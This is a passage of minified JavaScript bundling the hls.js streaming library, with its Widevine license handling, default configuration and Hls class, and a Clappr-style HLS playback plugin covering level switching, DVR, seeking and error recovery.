a=3-this._requestLicenseFailureCount+1;F.logger.warn("Retrying license request, "+a+" attempts left"),this._requestLicense(n,i)}},r._generateLicenseRequestChallenge=function e(t,r){if(t.mediaKeySystemDomain===_.WIDEVINE)return r;throw new Error("unsupported key-system: "+t.mediaKeySystemDomain)},r._requestLicense=function e(t,r){F.logger.log("Requesting content license for key-system");var n=this._mediaKeysList[0];if(!n)return F.logger.error("Fatal error: Media is encrypted but no key-system access has been obtained yet"),void this.hls.trigger(M.default.ERROR,{type:A.ErrorTypes.KEY_SYSTEM_ERROR,details:A.ErrorDetails.KEY_SYSTEM_NO_ACCESS,fatal:!0});try{var i=this.getLicenseServerUrl(n.mediaKeySystemDomain),a=this._createLicenseXhr(i,t,r);F.logger.log("Sending license request to URL: "+i);var s=this._generateLicenseRequestChallenge(n,t);a.send(s)}catch(e){F.logger.error("Failure requesting DRM license: "+e),this.hls.trigger(M.default.ERROR,{type:A.ErrorTypes.KEY_SYSTEM_ERROR,details:A.ErrorDetails.KEY_SYSTEM_LICENSE_REQUEST_FAILED,fatal:!0})}},r.onMediaAttached=function e(t){if(this._emeEnabled){var r=t.media;this._media=r,r.addEventListener("encrypted",this._onMediaEncrypted)}},r.onMediaDetached=function e(){var t=this._media,r=this._mediaKeysList;t&&(t.removeEventListener("encrypted",this._onMediaEncrypted),this._media=null,this._mediaKeysList=[],Promise.all(r.map((function(e){if(e.mediaKeysSession)return e.mediaKeysSession.close().catch((function(){}))}))).then((function(){return t.setMediaKeys(null)})).catch((function(){})))},r.onManifestParsed=function e(t){if(this._emeEnabled){var r=t.levels.map((function(e){return e.audioCodec})),n=t.levels.map((function(e){return e.videoCodec}));this._attemptKeySystemAccess(_.WIDEVINE,r,n)}},function fn(e,t,r){return t&&dn(e.prototype,t),r&&dn(e,r),e}(e,[{key:"requestMediaKeySystemAccess",get:function e(){if(!this._requestMediaKeySystemAccess)throw new Error("No requestMediaKeySystemAccess function configured");return this._requestMediaKeySystemAccess}}]),e}(i),mn=An;function yn(t,e){var r=Object.keys(t);if(Object.getOwnPropertySymbols){var n=Object.getOwnPropertySymbols(t);e&&(n=n.filter((function(e){return Object.getOwnPropertyDescriptor(t,e).enumerable}))),r.push.apply(r,n)}return r}function En(t){for(var e=1;e<arguments.length;e++){var r=null!=arguments[e]?arguments[e]:{};e%2?yn(Object(r),!0).forEach((function(e){bn(t,e,r[e])})):Object.getOwnPropertyDescriptors?Object.defineProperties(t,Object.getOwnPropertyDescriptors(r)):yn(Object(r)).forEach((function(e){Object.defineProperty(t,e,Object.getOwnPropertyDescriptor(r,e))}))}return t}function bn(e,t,r){return t in e?Object.defineProperty(e,t,{value:r,enumerable:!0,configurable:!0,writable:!0}):e[t]=r,e}var kn=En(En({autoStartLoad:!0,startPosition:-1,defaultAudioCodec:void 0,debug:!1,capLevelOnFPSDrop:!1,capLevelToPlayerSize:!1,initialLiveManifestSize:1,maxBufferLength:30,maxBufferSize:6e7,maxBufferHole:.5,lowBufferWatchdogPeriod:.5,highBufferWatchdogPeriod:3,nudgeOffset:.1,nudgeMaxRetry:3,maxFragLookUpTolerance:.25,liveSyncDurationCount:3,liveMaxLatencyDurationCount:1/0,liveSyncDuration:void 0,liveMaxLatencyDuration:void 0,liveDurationInfinity:!1,liveBackBufferLength:1/0,maxMaxBufferLength:600,enableWorker:!0,enableSoftwareAES:!0,manifestLoadingTimeOut:1e4,manifestLoadingMaxRetry:1,manifestLoadingRetryDelay:1e3,manifestLoadingMaxRetryTimeout:64e3,startLevel:void 0,levelLoadingTimeOut:1e4,levelLoadingMaxRetry:4,levelLoadingRetryDelay:1e3,levelLoadingMaxRetryTimeout:64e3,fragLoadingTimeOut:2e4,fragLoadingMaxRetry:6,fragLoadingRetryDelay:1e3,fragLoadingMaxRetryTimeout:64e3,startFragPrefetch:!1,fpsDroppedMonitoringPeriod:5e3,fpsDroppedMonitoringThreshold:.2,appendErrorMaxRetry:3,loader:Zt,fLoader:void 0,pLoader:void 0,xhrSetup:void 0,licenseXhrSetup:void 0,abrController:xt,bufferController:Ut,capLevelController:Yt,fpsController:qt,stretchShortVideoTrack:!1,maxAudioFramesDrift:1,forceKeyFrameOnDiscontinuity:!0,abrEwmaFastLive:3,abrEwmaSlowLive:9,abrEwmaFastVoD:3,abrEwmaSlowVoD:9,abrEwmaDefaultEstimate:5e5,abrBandWidthFactor:.95,abrBandWidthUpFactor:.7,abrMaxWithRealBitrate:!1,maxStarvationDelay:4,maxLoadingDelay:4,minAutoBitrate:0,emeEnabled:!1,widevineLicenseUrl:void 0,drmSystemOptions:{},requestMediaKeySystemAccessFunc:cn,testBandwidth:!0},function _n(){return{cueHandler:t,enableCEA708Captions:!0,enableWebVTT:!0,captionsTextTrack1Label:"English",captionsTextTrack1LanguageCode:"en",captionsTextTrack2Label:"Spanish",captionsTextTrack2LanguageCode:"es",captionsTextTrack3Label:"Unknown CC",captionsTextTrack3LanguageCode:"",captionsTextTrack4Label:"Unknown CC",captionsTextTrack4LanguageCode:"",renderTextTracksNatively:!0}}()),{},{subtitleStreamController:un,subtitleTrackController:tn,timelineController:qr,audioStreamController:ur,audioTrackController:rr,emeController:mn});function Tn(t,e){var r=Object.keys(t);if(Object.getOwnPropertySymbols){var n=Object.getOwnPropertySymbols(t);e&&(n=n.filter((function(e){return Object.getOwnPropertyDescriptor(t,e).enumerable}))),r.push.apply(r,n)}return r}function Sn(t){for(var e=1;e<arguments.length;e++){var r=null!=arguments[e]?arguments[e]:{};e%2?Tn(Object(r),!0).forEach((function(e){Cn(t,e,r[e])})):Object.getOwnPropertyDescriptors?Object.defineProperties(t,Object.getOwnPropertyDescriptors(r)):Tn(Object(r)).forEach((function(e){Object.defineProperty(t,e,Object.getOwnPropertyDescriptor(r,e))}))}return t}function Cn(e,t,r){return t in e?Object.defineProperty(e,t,{value:r,enumerable:!0,configurable:!0,writable:!0}):e[t]=r,e}function T(e){if(void 0===e)throw new ReferenceError("this hasn't been initialised - super() hasn't been called");return e}function Rn(e,t){for(var r=0;r<t.length;r++){var n=t[r];n.enumerable=n.enumerable||!1,n.configurable=!0,"value"in n&&(n.writable=!0),Object.defineProperty(e,n.key,n)}}function wn(e,t,r){return t&&Rn(e.prototype,t),r&&Rn(e,r),e}var Ln=function(k){function _(e){var t;void 0===e&&(e={}),(t=k.call(this)||this).config=void 0,t._autoLevelCapping=void 0,t.abrController=void 0,t.capLevelController=void 0,t.levelController=void 0,t.streamController=void 0,t.networkControllers=void 0,t.audioTrackController=void 0,t.subtitleTrackController=void 0,t.emeController=void 0,t.coreComponents=void 0,t.media=null,t.url=null;var r=_.DefaultConfig;if((e.liveSyncDurationCount||e.liveMaxLatencyDurationCount)&&(e.liveSyncDuration||e.liveMaxLatencyDuration))throw new Error("Illegal hls.js config: don't mix up liveSyncDurationCount/liveMaxLatencyDurationCount and liveSyncDuration/liveMaxLatencyDuration");t.config=Sn(Sn({},r),e);var i=T(t).config;if(void 0!==i.liveMaxLatencyDurationCount&&i.liveMaxLatencyDurationCount<=i.liveSyncDurationCount)throw new Error('Illegal hls.js config: "liveMaxLatencyDurationCount" must be gt "liveSyncDurationCount"');if(void 0!==i.liveMaxLatencyDuration&&(void 0===i.liveSyncDuration||i.liveMaxLatencyDuration<=i.liveSyncDuration))throw new Error('Illegal hls.js config: "liveMaxLatencyDuration" must be gt "liveSyncDuration"');Object(F.enableLogs)(i.debug),t._autoLevelCapping=-1;var a=t.abrController=new i.abrController(T(t)),s=new i.bufferController(T(t)),o=t.capLevelController=new i.capLevelController(T(t)),l=new i.fpsController(T(t)),u=new de(T(t)),c=new pe(T(t)),d=new Ae(T(t)),f=new kt(T(t)),h=t.levelController=new vt(T(t)),p=new ye(T(t)),g=[h,t.streamController=new ct(T(t),p)],A=i.audioStreamController;A&&g.push(new A(T(t),p)),t.networkControllers=g;var m=[u,c,d,a,s,o,l,f,p];if(A=i.audioTrackController){var y=new A(T(t));t.audioTrackController=y,m.push(y)}if(A=i.subtitleTrackController){var E=new A(T(t));t.subtitleTrackController=E,g.push(E)}if(A=i.emeController){var b=new A(T(t));t.emeController=b,m.push(b)}return(A=i.subtitleStreamController)&&g.push(new A(T(t),p)),(A=i.timelineController)&&m.push(new A(T(t))),t.coreComponents=m,t}!function On(e,t){e.prototype=Object.create(t.prototype),e.prototype.constructor=e,e.__proto__=t}(_,k),_.isSupported=function e(){return function _t(){var e=s();if(!e)return!1;var t=self.SourceBuffer||self.WebKitSourceBuffer,r=e&&"function"==typeof e.isTypeSupported&&e.isTypeSupported('video/mp4; codecs="avc1.42E01E,mp4a.40.2"'),n=!t||t.prototype&&"function"==typeof t.prototype.appendBuffer&&"function"==typeof t.prototype.remove;return!!r&&!!n}()},wn(_,null,[{key:"version",get:function e(){return"0.14.17"}},{key:"Events",get:function e(){return M.default}},{key:"ErrorTypes",get:function e(){return A.ErrorTypes}},{key:"ErrorDetails",get:function e(){return A.ErrorDetails}},{key:"DefaultConfig",get:function e(){return _.defaultConfig?_.defaultConfig:kn},set:function e(t){_.defaultConfig=t}}]);var e=_.prototype;return e.destroy=function e(){F.logger.log("destroy"),this.trigger(M.default.DESTROYING),this.detachMedia(),this.coreComponents.concat(this.networkControllers).forEach((function(e){e.destroy()})),this.url=null,this.removeAllListeners(),this._autoLevelCapping=-1},e.attachMedia=function e(t){F.logger.log("attachMedia"),this.media=t,this.trigger(M.default.MEDIA_ATTACHING,{media:t})},e.detachMedia=function e(){F.logger.log("detachMedia"),this.trigger(M.default.MEDIA_DETACHING),this.media=null},e.loadSource=function e(t){t=n.buildAbsoluteURL(window.location.href,t,{alwaysNormalize:!0}),F.logger.log("loadSource:"+t),this.url=t,this.trigger(M.default.MANIFEST_LOADING,{url:t})},e.startLoad=function e(t){void 0===t&&(t=-1),F.logger.log("startLoad("+t+")"),this.networkControllers.forEach((function(e){e.startLoad(t)}))},e.stopLoad=function e(){F.logger.log("stopLoad"),this.networkControllers.forEach((function(e){e.stopLoad()}))},e.swapAudioCodec=function e(){F.logger.log("swapAudioCodec"),this.streamController.swapAudioCodec()},e.recoverMediaError=function e(){F.logger.log("recoverMediaError");var t=this.media;this.detachMedia(),t&&this.attachMedia(t)},e.removeLevel=function e(t,r){void 0===r&&(r=0),this.levelController.removeLevel(t,r)},wn(_,[{key:"levels",get:function e(){return this.levelController.levels}},{key:"currentLevel",get:function e(){return this.streamController.currentLevel},set:function e(t){F.logger.log("set currentLevel:"+t),this.loadLevel=t,this.streamController.immediateLevelSwitch()}},{key:"nextLevel",get:function e(){return this.streamController.nextLevel},set:function e(t){F.logger.log("set nextLevel:"+t),this.levelController.manualLevel=t,this.streamController.nextLevelSwitch()}},{key:"loadLevel",get:function e(){return this.levelController.level},set:function e(t){F.logger.log("set loadLevel:"+t),this.levelController.manualLevel=t}},{key:"nextLoadLevel",get:function e(){return this.levelController.nextLoadLevel},set:function e(t){this.levelController.nextLoadLevel=t}},{key:"firstLevel",get:function e(){return Math.max(this.levelController.firstLevel,this.minAutoLevel)},set:function e(t){F.logger.log("set firstLevel:"+t),this.levelController.firstLevel=t}},{key:"startLevel",get:function e(){return this.levelController.startLevel},set:function e(t){F.logger.log("set startLevel:"+t),-1!==t&&(t=Math.max(t,this.minAutoLevel)),this.levelController.startLevel=t}},{key:"capLevelToPlayerSize",set:function e(t){var r=!!t;r!==this.config.capLevelToPlayerSize&&(r?this.capLevelController.startCapping():(this.capLevelController.stopCapping(),this.autoLevelCapping=-1,this.streamController.nextLevelSwitch()),this.config.capLevelToPlayerSize=r)}},{key:"autoLevelCapping",get:function e(){return this._autoLevelCapping},set:function e(t){F.logger.log("set autoLevelCapping:"+t),this._autoLevelCapping=t}},{key:"bandwidthEstimate",get:function e(){var t=this.abrController._bwEstimator;return t?t.getEstimate():NaN}},{key:"autoLevelEnabled",get:function e(){return-1===this.levelController.manualLevel}},{key:"manualLevel",get:function e(){return this.levelController.manualLevel}},{key:"minAutoLevel",get:function e(){for(var t=this.levels,r=this.config.minAutoBitrate,n=t?t.length:0,i=0;i<n;i++){if((t[i].realBitrate?Math.max(t[i].realBitrate,t[i].bitrate):t[i].bitrate)>r)return i}return 0}},{key:"maxAutoLevel",get:function e(){var t=this.levels,r=this.autoLevelCapping;return-1===r&&t&&t.length?t.length-1:r}},{key:"nextAutoLevel",get:function e(){return Math.min(Math.max(this.abrController.nextAutoLevel,this.minAutoLevel),this.maxAutoLevel)},set:function e(t){this.abrController.nextAutoLevel=Math.max(this.minAutoLevel,t)}},{key:"audioTracks",get:function e(){var t=this.audioTrackController;return t?t.audioTracks:[]}},{key:"audioTrack",get:function e(){var t=this.audioTrackController;return t?t.audioTrack:-1},set:function e(t){var r=this.audioTrackController;r&&(r.audioTrack=t)}},{key:"liveSyncPosition",get:function e(){return this.streamController.liveSyncPosition}},{key:"subtitleTracks",get:function e(){var t=this.subtitleTrackController;return t?t.subtitleTracks:[]}},{key:"subtitleTrack",get:function e(){var t=this.subtitleTrackController;return t?t.subtitleTrack:-1},set:function e(t){var r=this.subtitleTrackController;r&&(r.subtitleTrack=t)}},{key:"subtitleDisplay",get:function e(){var t=this.subtitleTrackController;return!!t&&t.subtitleDisplay},set:function e(t){var r=this.subtitleTrackController;r&&(r.subtitleDisplay=t)}}]),_}(Ce);Ln.defaultConfig=void 0},"./src/polyfills/number.js":function(e,t,r){r.r(t),r.d(t,"isFiniteNumber",(function(){return n})),r.d(t,"MAX_SAFE_INTEGER",(function(){return i}));var n=Number.isFinite||function(e){return"number"==typeof e&&isFinite(e)},i=Number.MAX_SAFE_INTEGER||9007199254740991},"./src/utils/get-self-scope.js":function(e,t,r){function n(){return"undefined"==typeof window?self:window}r.r(t),r.d(t,"getSelfScope",(function(){return n}))},"./src/utils/logger.js":function(e,t,r){r.r(t),r.d(t,"enableLogs",(function(){return d})),r.d(t,"logger",(function(){return f}));var n=r("./src/utils/get-self-scope.js");function a(){}var i={trace:a,debug:a,log:a,warn:a,info:a,error:a},s=i;var l=Object(n.getSelfScope)();function c(t){for(var e=arguments.length,r=new Array(e>1?e-1:0),n=1;n<e;n++)r[n-1]=arguments[n];r.forEach((function(e){s[e]=t[e]?t[e].bind(t):function u(n){var i=l.console[n];return i?function(){for(var e=arguments.length,t=new Array(e),r=0;r<e;r++)t[r]=arguments[r];t[0]&&(t[0]=function o(e,t){return"["+e+"] > "+t}(n,t[0])),i.apply(l.console,t)}:a}(e)}))}var d=function e(t){if(l.console&&!0===t||"object"==typeof t){c(t,"debug","log","info","warn","error");try{s.log()}catch(e){s=i}}else s=i},f=s}}).default})),function Gi(e){return e&&e.__esModule&&Object.prototype.hasOwnProperty.call(e,"default")?e.default:e}(Ki.exports)),zi=t.now,$i=t.assign,Wi=t.listContainsIgnoreCase,Xi=(k.register("PLAYBACK_FRAGMENT_CHANGED"),k.register("PLAYBACK_FRAGMENT_PARSING_METADATA"),function(e){!function Ri(e,t){if("function"!=typeof t&&null!==t)throw new TypeError("Super expression must either be null or a function");e.prototype=Object.create(t&&t.prototype,{constructor:{value:e,writable:!0,configurable:!0}}),t&&wi(e,t)}(a,e);var i=Di(a);function a(){var e;!function _i(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}(this,a);for(var t=arguments.length,r=new Array(t),n=0;n<t;n++)r[n]=arguments[n];return(e=i.call.apply(i,[this].concat(r))).options.playback=ki(ki({},e.options),e.options.playback),e.options.hlsPlayback=ki(ki({},e.defaultOptions),e.options.hlsPlayback),e._minDvrSize=void 0===e.options.hlsMinimumDvrSize?60:e.options.hlsMinimumDvrSize,e._extrapolatedWindowNumSegments=e.options.playback&&void 0!==e.options.playback.extrapolatedWindowNumSegments?e.options.playback.extrapolatedWindowNumSegments:2,e._playbackType=S.VOD,e._lastTimeUpdate={current:0,total:0},e._lastDuration=null,e._playableRegionStartTime=0,e._localStartTimeCorrelation=null,e._localEndTimeCorrelation=null,e._playableRegionDuration=0,e._programDateTime=0,e._durationExcludesAfterLiveSyncPoint=!1,e._segmentTargetDuration=null,e._playlistType=null,e._recoverAttemptsRemaining=e.options.hlsRecoverAttempts||16,e}return function Si(e,t,r){return t&&Ti(e.prototype,t),r&&Ti(e,r),e}(a,[{key:"name",get:function e(){return"hls"}},{key:"supportedVersion",get:function e(){return{min:"0.4.18"}}},{key:"levels",get:function e(){return this._levels||[]}},{key:"currentLevel",get:function e(){return null===this._currentLevel||void 0===this._currentLevel?-1:this._currentLevel},set:function e(t){this._currentLevel=t,this.trigger(k.PLAYBACK_LEVEL_SWITCH_START),this.options.playback.hlsUseNextLevel?this._hls.nextLevel=this._currentLevel:this._hls.currentLevel=this._currentLevel}},{key:"isReady",get:function e(){return this._isReadyState}},{key:"_startTime",get:function e(){return this._playbackType===S.LIVE&&"EVENT"!==this._playlistType?this._extrapolatedStartTime:this._playableRegionStartTime}},{key:"_now",get:function e(){return zi()}},{key:"_extrapolatedStartTime",get:function e(){if(!this._localStartTimeCorrelation)return this._playableRegionStartTime;var t=this._localStartTimeCorrelation,r=this._now-t.local,n=(t.remote+r)/1e3;return Math.min(n,this._playableRegionStartTime+this._extrapolatedWindowDuration)}},{key:"_extrapolatedEndTime",get:function e(){var t=this._playableRegionStartTime+this._playableRegionDuration;if(!this._localEndTimeCorrelation)return t;var r=this._localEndTimeCorrelation,n=this._now-r.local,i=(r.remote+n)/1e3;return Math.max(t-this._extrapolatedWindowDuration,Math.min(i,t))}},{key:"_duration",get:function e(){return this._extrapolatedEndTime-this._startTime}},{key:"_extrapolatedWindowDuration",get:function e(){return null===this._segmentTargetDuration?0:this._extrapolatedWindowNumSegments*this._segmentTargetDuration}},{key:"bandwidthEstimate",get:function e(){return this._hls&&this._hls.bandwidthEstimate}},{key:"defaultOptions",get:function e(){return{preload:!0}}},{key:"customListeners",get:function e(){return this.options.hlsPlayback&&this.options.hlsPlayback.customListeners||[]}},{key:"_setup",value:function e(){var r=this;this._manifestParsed=!1,this._ccIsSetup=!1,this._ccTracksUpdated=!1,this._hls&&this._hls.destroy(),this._hls=new x($i({},this.options.playback.hlsjsConfig)),this._hls.once(x.Events.MEDIA_ATTACHED,(function(){r.options.hlsPlayback.preload&&r._hls.loadSource(r.options.src)})),this._hls.on(x.Events.MANIFEST_PARSED,(function(){return r._manifestParsed=!0})),this._hls.on(x.Events.LEVEL_LOADED,(function(e,t){return r._updatePlaybackType(e,t)})),this._hls.on(x.Events.LEVEL_UPDATED,(function(e,t){return r._onLevelUpdated(e,t)})),this._hls.on(x.Events.LEVEL_SWITCHING,(function(e,t){return r._onLevelSwitch(e,t)})),this._hls.on(x.Events.FRAG_CHANGED,(function(e,t){return r._onFragmentChanged(e,t)})),this._hls.on(x.Events.FRAG_LOADED,(function(e,t){return r._onFragmentLoaded(e,t)})),this._hls.on(x.Events.FRAG_PARSING_METADATA,(function(e,t){return r._onFragmentParsingMetadata(e,t)})),this._hls.on(x.Events.ERROR,(function(e,t){return r._onHLSJSError(e,t)})),this._hls.on(x.Events.SUBTITLE_TRACK_LOADED,(function(e,t){return r._onSubtitleLoaded(e,t)})),this._hls.on(x.Events.SUBTITLE_TRACKS_UPDATED,(function(){return r._ccTracksUpdated=!0})),this.bindCustomListeners(),this._hls.attachMedia(this.el)}},{key:"bindCustomListeners",value:function e(){var n=this;this.customListeners.forEach((function(e){var t=e.eventName,r=e.once?"once":"on";t&&n._hls["".concat(r)](t,e.callback)}))}},{key:"unbindCustomListeners",value:function e(){var r=this;this.customListeners.forEach((function(e){var t=e.eventName;t&&r._hls.off(t,e.callback)}))}},{key:"_onFragmentParsingMetadata",value:function e(t,r){this.trigger(k.Custom.PLAYBACK_FRAGMENT_PARSING_METADATA,{evt:t,data:r})}},{key:"render",value:function e(){return this._ready(),Ni(N(a.prototype),"render",this).call(this)}},{key:"_ready",value:function e(){this._isReadyState||(!this._hls&&this._setup(),this._isReadyState=!0,this.trigger(k.PLAYBACK_READY,this.name))}},{key:"_recover",value:function e(t,r,n){if(this._recoveredDecodingError)if(this._recoveredAudioCodecError){b.error("hlsjs: failed to recover",{evt:t,data:r}),n.level=T.Levels.FATAL;var i=this.createError(n);this.trigger(k.PLAYBACK_ERROR,i),this.stop()}else this._recoveredAudioCodecError=!0,this._hls.swapAudioCodec(),this._hls.recoverMediaError();else this._recoveredDecodingError=!0,this._hls.recoverMediaError()}},{key:"_setupSrc",value:function e(t){}},{key:"_startTimeUpdateTimer",value:function e(){var t=this;this._timeUpdateTimer||(this._timeUpdateTimer=setInterval((function(){t._onDurationChange(),t._onTimeUpdate()}),100))}},{key:"_stopTimeUpdateTimer",value:function e(){this._timeUpdateTimer&&(clearInterval(this._timeUpdateTimer),this._timeUpdateTimer=null)}},{key:"getProgramDateTime",value:function e(){return this._programDateTime}},{key:"getDuration",value:function e(){return this._duration}},{key:"getCurrentTime",value:function e(){return Math.max(0,this.el.currentTime-this._startTime)}},{key:"getStartTimeOffset",value:function e(){return this._startTime}},{key:"seekPercentage",value:function e(t){var r=this._duration;t>0&&(r=this._duration*(t/100)),this.seek(r)}},{key:"seek",value:function e(t){t<0&&(b.warn("Attempt to seek to a negative time. Resetting to live point. Use seekToLivePoint() to seek to the live point."),t=this.getDuration()),this.dvrEnabled&&this._updateDvr(t<this.getDuration()-3),t+=this._startTime,this.el.currentTime=t}},{key:"seekToLivePoint",value:function e(){this.seek(this.getDuration())}},{key:"_updateDvr",value:function e(t){this.trigger(k.PLAYBACK_DVR,t),this.trigger(k.PLAYBACK_STATS_ADD,{dvr:t})}},{key:"_updateSettings",value:function e(){this._playbackType===S.VOD?this.settings.left=["playpause","position","duration"]:this.dvrEnabled?this.settings.left=["playpause"]:this.settings.left=["playstop"],this.settings.seekEnabled=this.isSeekEnabled(),this.trigger(k.PLAYBACK_SETTINGSUPDATE)}},{key:"_onHLSJSError",value:function e(t,r){var i,n={code:"".concat(r.type,"_").concat(r.details),description:"".concat(this.name," error: type: ").concat(r.type,", details: ").concat(r.details),raw:r};if(r.response&&(n.description+=", response: ".concat(JSON.stringify(r.response))),r.fatal)if(this._recoverAttemptsRemaining>0)switch(this._recoverAttemptsRemaining-=1,r.type){case x.ErrorTypes.NETWORK_ERROR:switch(r.details){case x.ErrorDetails.MANIFEST_LOAD_ERROR:case x.ErrorDetails.MANIFEST_LOAD_TIMEOUT:case x.ErrorDetails.MANIFEST_PARSING_ERROR:case x.ErrorDetails.LEVEL_LOAD_ERROR:case x.ErrorDetails.LEVEL_LOAD_TIMEOUT:b.error("hlsjs: unrecoverable network fatal error.",{evt:t,data:r}),i=this.createError(n),this.trigger(k.PLAYBACK_ERROR,i),this.stop();break;default:b.warn("hlsjs: trying to recover from network error.",{evt:t,data:r}),n.level=T.Levels.WARN,this._hls.startLoad()}break;case x.ErrorTypes.MEDIA_ERROR:b.warn("hlsjs: trying to recover from media error.",{evt:t,data:r}),n.level=T.Levels.WARN,this._recover(t,r,n);break;default:b.error("hlsjs: could not recover from error.",{evt:t,data:r}),i=this.createError(n),this.trigger(k.PLAYBACK_ERROR,i),this.stop()}else b.error("hlsjs: could not recover from error after maximum number of attempts.",{evt:t,data:r}),i=this.createError(n),this.trigger(k.PLAYBACK_ERROR,i),this.stop();else{if(this.options.playback.triggerFatalErrorOnResourceDenied&&this._keyIsDenied(r))return b.error("hlsjs: could not load decrypt key.",{evt:t,data:r}),i=this.createError(n),this.trigger(k.PLAYBACK_ERROR,i),void this.stop();n.level=T.Levels.WARN,b.warn("hlsjs: non-fatal error occurred",{evt:t,data:r})}}},{key:"_keyIsDenied",value:function e(t){return t.type===x.ErrorTypes.NETWORK_ERROR&&t.details===x.ErrorDetails.KEY_LOAD_ERROR&&t.response&&t.response.code>=400}},{key:"_onTimeUpdate",value:function e(){var t={current:this.getCurrentTime(),total:this.getDuration(),firstFragDateTime:this.getProgramDateTime()};this._lastTimeUpdate&&t.current===this._lastTimeUpdate.current&&t.total===this._lastTimeUpdate.total||(this._lastTimeUpdate=t,this.trigger(k.PLAYBACK_TIMEUPDATE,t,this.name))}},{key:"_onDurationChange",value:function e(){var t=this.getDuration();this._lastDuration!==t&&(this._lastDuration=t,Ni(N(a.prototype),"_onDurationChange",this).call(this))}},{key:"_onProgress",value:function e(){if(this.el.buffered.length){for(var t=[],r=0,n=0;n<this.el.buffered.length;n++)t=[].concat(xi(t),[{start:Math.max(0,this.el.buffered.start(n)-this._playableRegionStartTime),end:Math.max(0,this.el.buffered.end(n)-this._playableRegionStartTime)}]),this.el.currentTime>=t[n].start&&this.el.currentTime<=t[n].end&&(r=n);var i={start:t[r].start,current:t[r].end,total:this.getDuration()};this.trigger(k.PLAYBACK_PROGRESS,i,t)}}},{key:"play",value:function e(){!this._hls&&this._setup(),!this._manifestParsed&&!this.options.hlsPlayback.preload&&this._hls.loadSource(this.options.src),Ni(N(a.prototype),"play",this).call(this),this._startTimeUpdateTimer()}},{key:"pause",value:function e(){this._hls&&(this.el.pause(),this.dvrEnabled&&this._updateDvr(!0))}},{key:"stop",value:function e(){this._stopTimeUpdateTimer(),this._hls&&(Ni(N(a.prototype),"stop",this).call(this),this._hls.destroy(),delete this._hls)}},{key:"destroy",value:function e(){this._stopTimeUpdateTimer(),this._hls&&(this._hls.destroy(),delete this._hls),Ni(N(a.prototype),"destroy",this).call(this)}},{key:"_updatePlaybackType",value:function e(t,r){this._playbackType=r.details.live?S.LIVE:S.VOD,this._onLevelUpdated(t,r),this._ccTracksUpdated&&this._playbackType===S.LIVE&&this.hasClosedCaptionsTracks&&this._onSubtitleLoaded()}},{key:"_fillLevels",value:function e(){this._levels=this._hls.levels.map((function(e,t){return{id:t,level:e,label:"".concat(e.bitrate/1e3,"Kbps")}})),this.trigger(k.PLAYBACK_LEVELS_AVAILABLE,this._levels)}},{key:"_onLevelUpdated",value:function e(t,r){this._segmentTargetDuration=r.details.targetduration,this._playlistType=r.details.type||null;var n=!1,i=!1,a=r.details.fragments,s=this._playableRegionStartTime,o=this._playableRegionDuration;if(0!==a.length){if(a[0].rawProgramDateTime&&(this._programDateTime=a[0].rawProgramDateTime),this._playableRegionStartTime!==a[0].start&&(n=!0,this._playableRegionStartTime=a[0].start),n)if(this._localStartTimeCorrelation){var l=this._localStartTimeCorrelation,u=this._now-l.local,c=(l.remote+u)/1e3;c<a[0].start?this._localStartTimeCorrelation={local:this._now,remote:1e3*a[0].start}:c>s+this._extrapolatedWindowDuration&&(this._localStartTimeCorrelation={local:this._now,remote:1e3*Math.max(a[0].start,s+this._extrapolatedWindowDuration)})}else this._localStartTimeCorrelation={local:this._now,remote:1e3*(a[0].start+this._extrapolatedWindowDuration/2)};var d=r.details.totalduration;if(this._playbackType===S.LIVE){var v=r.details.targetduration*((this.options.playback.hlsjsConfig||{}).liveSyncDurationCount||x.DefaultConfig.liveSyncDurationCount);v<=d?(d-=v,this._durationExcludesAfterLiveSyncPoint=!0):this._durationExcludesAfterLiveSyncPoint=!1}d!==this._playableRegionDuration&&(i=!0,this._playableRegionDuration=d);var g=a[0].start+d,A=s+o;if(g!==A)if(this._localEndTimeCorrelation){var y=this._localEndTimeCorrelation,E=this._now-y.local,b=(y.remote+E)/1e3;b>g?this._localEndTimeCorrelation={local:this._now,remote:1e3*g}:b<g-this._extrapolatedWindowDuration?this._localEndTimeCorrelation={local:this._now,remote:1e3*(g-this._extrapolatedWindowDuration)}:b>A&&(this._localEndTimeCorrelation={local:this._now,remote:1e3*A})}else this._localEndTimeCorrelation={local:this._now,remote:1e3*g};i&&this._onDurationChange(),n&&this._onProgress()}}},{key:"_onFragmentChanged",value:function e(t,r){this.trigger(k.Custom.PLAYBACK_FRAGMENT_CHANGED,r)}},{key:"_onFragmentLoaded",value:function e(t,r){this.trigger(k.PLAYBACK_FRAGMENT_LOADED,r)}},{key:"_onSubtitleLoaded",value:function e(){if(!this._ccIsSetup){this.trigger(k.PLAYBACK_SUBTITLE_AVAILABLE);var t=this._playbackType===S.LIVE?-1:this.closedCaptionsTrackId;this.closedCaptionsTrackId=t,this._ccIsSetup=!0}}},{key:"_onLevelSwitch",value:function e(t,r){this.levels.length||this._fillLevels(),this.trigger(k.PLAYBACK_LEVEL_SWITCH_END),this.trigger(k.PLAYBACK_LEVEL_SWITCH,r);var n=this._hls.levels[r.level];n&&(this.highDefinition=n.height>=720||n.bitrate/1e3>=2e3,this.trigger(k.PLAYBACK_HIGHDEFINITIONUPDATE,this.highDefinition),this.trigger(k.PLAYBACK_BITRATE,{height:n.height,width:n.width,bandwidth:n.bitrate,bitrate:n.bitrate,level:r.level}))}},{key:"dvrEnabled",get:function e(){return this._durationExcludesAfterLiveSyncPoint&&this._duration>=this._minDvrSize&&this.getPlaybackType()===S.LIVE}},{key:"getPlaybackType",value:function e(){return this._playbackType}},{key:"isSeekEnabled",value:function e(){return this._playbackType===S.VOD||this.dvrEnabled}}],[{key:"HLSJS",get:function e(){return x}}]),a}(R));return Xi.canPlay=function(e,t){var r=e.split("?")[0].match(/.*\.(.*)$/)||[],n=r.length>1&&"m3u8"===r[1].toLowerCase()||Wi(t,["application/vnd.apple.mpegurl","application/x-mpegURL"]);return!(!x.isSupported()||!n)},Ei.Loader.registerPlayback(Xi),F(F({},Ei),{},{HLS:Xi})}()}).call(this,r(31))},4:function(r,e,t){"use strict";function F(e){return(F="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(e){return typeof e}:function(e){return e&&"function"==typeof Symbol&&e.constructor===Symbol&&e!==Symbol.prototype?"symbol":typeof e})(e)}function u(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}function B(e,t){for(var r=0;r<t.length;r++){var n=t[r];n.enumerable=n.enumerable||!1,n.configurable=!0,"value"in n&&(n.writable=!0),Object.defineProperty(e,n.key,n)}}function 